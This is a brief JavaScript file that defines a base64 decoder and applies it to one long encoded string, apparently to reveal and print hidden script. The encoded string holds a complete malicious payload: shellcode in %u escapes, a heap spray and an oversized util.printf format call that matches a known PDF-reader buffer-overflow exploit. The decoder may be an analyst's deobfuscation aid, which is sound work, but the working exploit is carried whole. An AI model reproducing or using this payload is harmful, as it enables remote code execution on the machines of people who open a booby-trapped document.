function func(str) {
  b64s="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  while(str.substr(-1,1)=="=")str=str.substr(0,str.length-1);
  var b=str.split(""), i
  var s=Array(), t
  var lPos = b.length - b.length % 4
  for(i=0;i<lPos;i+=4){
    t=(b64s.indexOf(b[i])<<18)+(b64s.indexOf(b[i+1])<<12)+(b64s.indexOf(b[i+2])<<6)+b64s.indexOf(b[i+3])
    s.push( ((t>>16)&0xff), ((t>>8)&0xff), (t&0xff) )
  }
  if( (b.length-lPos) == 2 ){ t=(b64s.indexOf(b[lPos])<<18)+(b64s.indexOf(b[lPos+1])<<12); s.push( ((t>>16)&0xff)); }
  if( (b.length-lPos) == 3 ){ t=(b64s.indexOf(b[lPos])<<18)+(b64s.indexOf(b[lPos+1])<<12)+(b64s.indexOf(b[lPos+2])<<6); s.push( ((t>>16)&0xff), ((t>>8)&0xff) ); }
  for( i=s.length-1; i>=0; i-- ){
    if( s[i]>=168 ) s[i]=AZ.charAt(s[i]-163)
    else s[i]=String.fromCharCode(s[i])
  };
  console.log(s.join(""))
}
func("bGVtaXJvcz11bmVzY2FwZSgiJXUwM2ViJXVlYjU5JXVlODA1JXVmZmY4JXVmZmZmJXU0OTRmJXU0OTQ5JXU0OTQ5JXU1MTQ5JXU1NjVhJXU1ODU0JXUzMzM2JXU1NjMwJXUzNDU4JXUzMDQxJXUzNjQyJXU0ODQ4JXU0MjMwJXUzMDMzJXU0MzQyJXU1ODU2JXU0MjMyJXU0MjQ0JXUzNDQ4JXUzMjQxJXU0NDQxJXU0MTMwJXU1NDQ0JXU0NDQyJXU0MjUxJXU0MTMwJXU0MTQ0JXU1ODU2JXU1YTM0JXU0MjM4JXU0YTQ0JXU0ZDRmJXU0ZTRiJXUzMTQyJXUzNTRjJXU1NDRjJXU0MzQzJXU0YzQ5JXUzNjQ4JXU0YjQ5JXU0MzRlJXU1MDQxJXUzODQyJXU1MzQ2JXU1MDRjJXU0OTQ5JXU0ZTQ0JXU0ZjRjJXU0ZTRiJXU1MDQ1JXU0ZTRhJXU0ZTRiJXU0ZjRmJXU0ZjRmJXU0ZjRmJXU0NzQyJXU1NDRlJXU0OTQ5JXU1OTQ5JXUzOTQ5JXU0YzQzJXU0ZjRkJXU1MzRhJXU0YTQ5JXUzOTQ5JXUzOTQ5JXU0OTQ5JXUzMTQ0JXU0ZDQ5JXU0OTQ1JXU1MTQ0JXU0ZTQ5JXU0ODQ1JXUzMzQ2JXU1MTQ0JXU0ZDQ5JXU1OTQxJXU1MTQ0JXU0NDQxJXU0MTQ0JXU0ZTRjJXU0YTQ1JXU0MTQ0JXU0ZTRkJXUzODQ3JXU0ZTQxJXU0OTRjJXU1NjRjJXUzMTQ0JXU0ZTQ3JXU0YjQ5JXU0OTRjJXU0NjQ0JXUzMTQ0JXU0ZDQ3JXU1ODRkJXU0YTRjJXU1NzQ2JXU0YzRmJXU0YzUwJXU0YzRhJXU0MTQ0JXU0YTQ4JXUzOTRjJXU1NjQ0JXUzMTQ0JXU0NjRiJXU0ZjQzJXUzOTQ3JXU0YzQyJXUzNjRjJXU0MzRmJXU0ZTRkJXUzOTQxJXU0YzQyJXU0YzQ4JXUzMTRjJXUzNTUwJXU0OTRkJXU0ZDRlJXUzNzRiJXU1NzQyJXU0YzQyJXU0YzQ4JXU0YzQ3JXUzMTQ0JXU0NTQ2JXUzMTQ0JXU0ZDRmJXU0YjRkJXU0OTRjJXU0NTRjJXU1NDRhJXU1NzRhJXUzOTRjJXUzNTRhJXU0YTRjJXU1NTQyJXU0ZjRmJXUzMTQ0JXU1OTQxJXU0MTQ0JXU0ZDRmJXU0ODQ1JXU1OTRjJXU1NTRjJXUzNTRhJXU1NzRhJXU0OTRiJXU0OTRjJXU1NTRhJXU0MTQ0JXUzOTQ5JXUzOTRjJXU0NTRjJXU1MTQ0JXU1NjQzJXU0MTQ0JXUzNjUwJXU0MTRjJXUzNTRmJXU1OTQ3JXU0MTQ0JXU0NDQ5JXU0ZjQzJXU1OTRkJXU0YzQyJXU0NzQxJXU0YzQ5JXU1OTQ5JXUzOTQ5JXU0OTQ5JXU0MTRjJXU1NTRmJXU0OTQ2JXU0YzRiJXU0YzRmJXU0NjQ4JXU0YzUwJXU0NjQ1JXU0YzQzJXU0MTQ0JXUzNDQxJXU0ZjQzJXU0OTRhJXU0YzQyJXU1NzQxJXU0YTQ2JXU0OTQ5JXU1OTQ5JXU1OTQ5JXU1MTRjJXUzNTRmJXU0ODRjJXU0YzRmJXU0ZDRmJXU1MTQ5JXU0YTQ3JXU1MTQ5JXU0ZTRlJXUzNjQzJXUzMTQ5JXU0YTRmJXU1MTQ5JXU0YzQ3JXU1MTRjJXU1NzQ1JXU0YjQ5JXU0MTQ0JXU1NDQ1JXU0ZjQzJXU0YjQ5JXU0YzRjJXU0NjQ4JXU0YzUwJXU1NzQ1JXU1NTUwJXU0OTRkJXU1OTRjJXU0YzQ1JXU0ZjRhJXU0YjQ3JXU0ZjRlJXU0NTUwJXU0ZDRkJXUzOTRjJXUzOTRkJXU0ZTQxJXU0ZjRlJXUzOTQ5JXUzOTQ5JXU0YTRjJXU0NTQ5JXU0YzQ5JXU0YzQ5JXU0YzRjJXU0YzRmJXU0YzQ5JXU0NjQ4JXU0YzUwJXU0NjQ1JXU1MTQ0JXUzNDQ1JXU0YzQ5JXU0YzRjJXUzNjQ4JXU0YzUwJXUzNjQ5JXU0YzQ5JXUzNjQ4JXU0YzUwJXU1NjRkJXU0YTRjJXU1NTQ5JXU0MzQ1JXUzMTRlJXUzNTQ5JXU0ZTRlJXUzNjQyJXU0YzRhJXU0YzRiJXU0YzRmJXU0YzRjJXUzNjQ4JXU1NDRiJXU0YzQzJXU0YzQyJXU1MzQ0JXU1NzRiJXUzNzQ3JXU0YTRjJXU0NTQ5JXUzNTRjJXU0NzQxJXU0YjRmJXU0NjQ4JXU1NjQ4JXUzNjQ4JXU0ZDUwJXU0ZjRlJXU0ZTRkJXU0YzQ5JXU0ZTRiJXU0ZjQ4JXU0ZjRjJXU0ZDRhJXU0ZjRkJXU0ZjRkJXU0ZTRiJXU0ZjRlJXU0ZTRjJXU0ZTRjJXUzOTQ5JXU0ZDUwJXU0ZjRlJXU0ZTRkJXU0YzRjJXU0ZTQyJXU0ZTRjJXU0ZTRkJXU0ZjRlJXU0ZjQ2JXU0ZDRkJXU0ZjQyJXU0ZTRiJXU0ZjRlJXU0ZjRjJXU0ZTRkJXU0ZjQ4JXU0ZTRiJXU0ZTQyJXU0ZDRhJXU0OTQ5JXU0YzUwJXU0ZjQyJXU0ZjQ3JXU0ZDRlJXU0ZTQxJXU0ZjRlJXU0ZjRjJXU1OTQ5JXU0ZDRlJXU0ZTQxJXU0ZjQyJXU0ZTRkJXU0YzRkJXU0ZjQxJXU0ZTRiJXU0ZjRlJXU0ZjRhJXU0ZjRkJXU1OTQ5JXU0ZDQ1JXU0ZjQ4JXU0ZjRhJXU0ZjRkJXU0ZDQ1JXU0ZjQyJXU0ZjRiJXU0ZTRiJXU0ZjRhJXU0ZTRiJXU0ZTQyJXU0ZDRhJXU1OTQ5JXU0ZTRlJXU0ZTRiJXU0ZjQ1JXU0ZjQ2JXU0ZjQ4JXU0ZjQ3JXUzOTQ5JXU0YzRlJXU0YzRiJXU0ZDQ1JXU0ZDRkJXU0ZjQ4JXU0ZTUwJXU0ZjQ3JXU0ZjQ1JXU0ZjQ4JXU0ZjRhJXU0ZjRkJXU0YzRkJXU0ZjQ4JXU0ZDRmJXU0ZjQyJXU0ZjQ1JXU0ZjRlJXU0ZDRhJXUzOTQ5JXUzNjRhJXUzNzQ2JXU0NzQ2JXU0NzQyJXUzMzRjJXU1MjRmJXU0MjRmJXUzNjQ0JXUzNjQ1JXU0NzQzJXUzNjRhJXU0NzQ0JXU1NjQxJXUzNjQ3JXUzNjRmJXUzNzQzJXU0MjUwJXUzNjQzJXUzNjRmJXUzNjRkJXU1MjRmJXU1NzQ3JXU0NjRmJXU1NzQ0JXU0NjRiJXU0MjRmJXU0NjQ3JXU0NjQ1JXU1NzQ2JXUzNjQ1JXUzNzRhJXU0NjQ1JXU1MjUwJXU1NzQyJXU0NjRhJXU0NzQyJXU1MzRmJXUzNjRhJXU0MzRkJXUzMzQzJXUzMzQxJXU0ODQyJXUwMDVhIik7dmFyIG5hZGVzPXVuZXNjYXBlKCIldTBBMEEldTBBMEEiKTt2YXIgbWFrb2ZhbW9zPTIwO3ZhciBuYW5vcj1tYWtvZmFtb3MrbGVtaXJvcy5sZW5ndGg7d2hpbGUobmFkZXMubGVuZ3RoPG5hbm9yKW5hZGVzKz1uYWRlczt2YXIgZmFkYWQ9bmFkZXMuc3Vic3RyaW5nKDAsbmFub3IpO3ZhciBsdXNpYmlyYXNhPW5hZGVzLnN1YnN0cmluZygwLG5hZGVzLmxlbmd0aC1uYW5vcik7d2hpbGUobHVzaWJpcmFzYS5sZW5ndGgrbmFub3I8MHg2MDAwMClsdXNpYmlyYXNhPWx1c2liaXJhc2ErbHVzaWJpcmFzYStmYWRhZDt2YXIgdmF0ZWtlcmU9bmV3IEFycmF5KCk7Zm9yKHZlbmVyOT0wO3ZlbmVyOTwxMjAwO3ZlbmVyOSsrKXt2YXRla2VyZVt2ZW5lcjldPWx1c2liaXJhc2ErbGVtaXJvc312YXIga2VraWZpZHUxPTEyOTk5OTk5OTk5OTk5OTk5OTk5ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4O3V0aWwucHJpbnRmKCIlNDUwMDBmIixrZWtpZmlkdTEpOw==");